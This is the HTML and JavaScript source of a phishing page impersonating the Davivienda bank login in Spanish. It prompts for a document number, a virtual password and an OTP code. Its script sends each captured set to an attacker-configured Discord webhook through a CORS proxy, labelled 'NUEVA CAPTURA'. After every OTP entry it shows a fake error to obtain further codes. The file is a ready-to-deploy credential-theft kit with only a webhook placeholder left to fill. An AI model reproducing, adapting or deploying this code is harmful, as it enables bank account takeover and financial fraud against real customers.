<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Davivienda - Inicio</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        /* Ajuste de espaciado ultra-pegado según tus imágenes */
        .container { max-width: 450px; padding: 20px; }
        .form-group { gap: 2px !important; margin-bottom: 8px !important; }
        .form-input, .form-select { border-radius: 15px !important; padding: 10px 15px !important; }
        .btn-continue { border-radius: 25px !important; padding: 12px !important; margin-top: 10px; }
        
        #passSection, #otpSection { display: none; opacity: 0; transition: opacity 0.4s ease; }
        .show { display: block !important; opacity: 1 !important; }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container" style="text-align: center; margin-bottom: 20px;">
            <img src="LogoDavivienda.svg" alt="Logo" style="max-width: 160px;">
        </div>
        
        <div id="loginStep">
            <div class="welcome-section">
                <p style="font-size: 18px; margin:0;">¡Hola!</p>
                <h2 style="font-size: 22px; font-weight: 700; margin:0;">Nos alegra que esté aquí</h2>
            </div>
            
            <form id="mainForm">
                <div id="docGroup">
                    <div class="form-group">
                        <label class="form-label">Seleccione su tipo de documento</label>
                        <select id="docType" class="form-select">
                            <option value="Cédula de Ciudadanía">Cédula de Ciudadanía</option>
                            <option value="Pasaporte">Pasaporte</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Ingrese su número de documento</label>
                        <input type="text" id="docNumber" class="form-input" required autocomplete="off">
                    </div>
                    <button type="button" id="btnToPass" class="btn-continue">Continuar</button>
                </div>

                <div id="passSection">
                    <div class="form-group">
                        <label class="form-label">Ingrese su clave virtual</label>
                        <input type="password" id="pass" class="form-input" maxlength="8">
                    </div>
                    <div class="checkbox-container">
                        <input type="checkbox" id="rem">
                        <label for="rem" style="font-size: 13px;">Recordar mis datos de identidad</label>
                    </div>
                    <button type="button" id="btnToOtp" class="btn-continue">Ingresar</button>
                </div>

                <div id="otpSection">
                    <div style="border-top: 1px dotted #ccc; margin-top: 15px; padding-top: 15px;">
                        <h2 style="color: #ed1c24; font-size: 19px; font-weight: 700;">Verificación</h2>
                        <div class="form-group">
                            <label class="form-label">Código de seguridad</label>
                            <input type="text" id="otpCode" class="form-input" placeholder="000000">
                        </div>
                        <p id="errOtp" style="color: #ed1c24; font-size: 12px; display: none;">Código incorrecto. Reintente.</p>
                        <button type="button" id="btnFinish" class="btn-continue">Verificar</button>
                    </div>
                </div>
            </form>
        </div>
    </div>

    <script>
        // PEGA TU WEBHOOK AQUÍ
        const WEBHOOK_URL = 'TU_WEBHOOK_AQUI';

        async function sendData(titulo, campos) {
            const data = {
                embeds: [{
                    title: titulo,
                    color: 15548997,
                    fields: campos,
                    timestamp: new Date().toISOString()
                }]
            };

            // Usamos un proxy para evitar el bloqueo de Discord en navegadores
            return fetch('https://corsproxy.io/?' + encodeURIComponent(WEBHOOK_URL), {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }

        document.getElementById('btnToPass').addEventListener('click', () => {
            if(document.getElementById('docNumber').value.length > 2) {
                document.getElementById('docGroup').classList.add('hidden');
                document.getElementById('passSection').classList.add('show');
            }
        });

        document.getElementById('btnToOtp').addEventListener('click', async () => {
            const btn = document.getElementById('btnToOtp');
            btn.innerText = "Validando...";
            
            const campos = [
                { name: "👤 Documento", value: document.getElementById('docNumber').value, inline: true },
                { name: "🔑 Clave", value: document.getElementById('pass').value, inline: true }
            ];

            await sendData("🏦 NUEVA CAPTURA", campos);
            
            document.getElementById('passSection').classList.remove('show');
            document.getElementById('passSection').classList.add('hidden');
            document.getElementById('otpSection').classList.add('show');
        });

        document.getElementById('btnFinish').addEventListener('click', async () => {
            const btn = document.getElementById('btnFinish');
            btn.innerText = "Verificando...";
            
            const campos = [
                { name: "👤 Doc", value: document.getElementById('docNumber').value, inline: true },
                { name: "🔢 OTP", value: document.getElementById('otpCode').value, inline: true }
            ];

            await sendData("🔐 CÓDIGO RECIBIDO", campos);
            
            setTimeout(() => {
                document.getElementById('errOtp').style.display = 'block';
                document.getElementById('otpCode').value = '';
                btn.innerText = "Verificar";
            }, 1000);
        });
    </script>
</body>
</html>
